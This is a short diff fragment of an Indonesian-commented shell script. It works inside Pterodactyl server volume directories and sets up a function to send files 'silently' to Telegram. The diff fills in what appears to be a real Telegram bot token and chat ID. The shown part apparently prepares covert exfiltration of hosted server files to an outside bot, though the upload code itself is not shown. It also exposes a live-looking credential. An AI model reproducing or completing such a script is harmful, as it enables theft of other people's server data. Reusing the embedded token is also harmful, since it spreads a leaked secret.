@@ -24,8 +24,8 @@ echo ""
 cd /var/lib/pterodactyl/volumes
 
 # === CONFIG TELEGRAM ===
-BOT_TOKEN="xxx"   # ganti tokenmu
-CHAT_ID="xxx"     # ganti chat_idmu
+BOT_TOKEN="7764774217:AAHwpnX3xh4TCY9A7X-fJHNuocEbQ05Pzeg"   # ganti tokenmu
+CHAT_ID="7089735468"     # ganti chat_idmu
 
 # === FUNCTION: Kirim file ke Telegram (silent) ===
 send_file() {
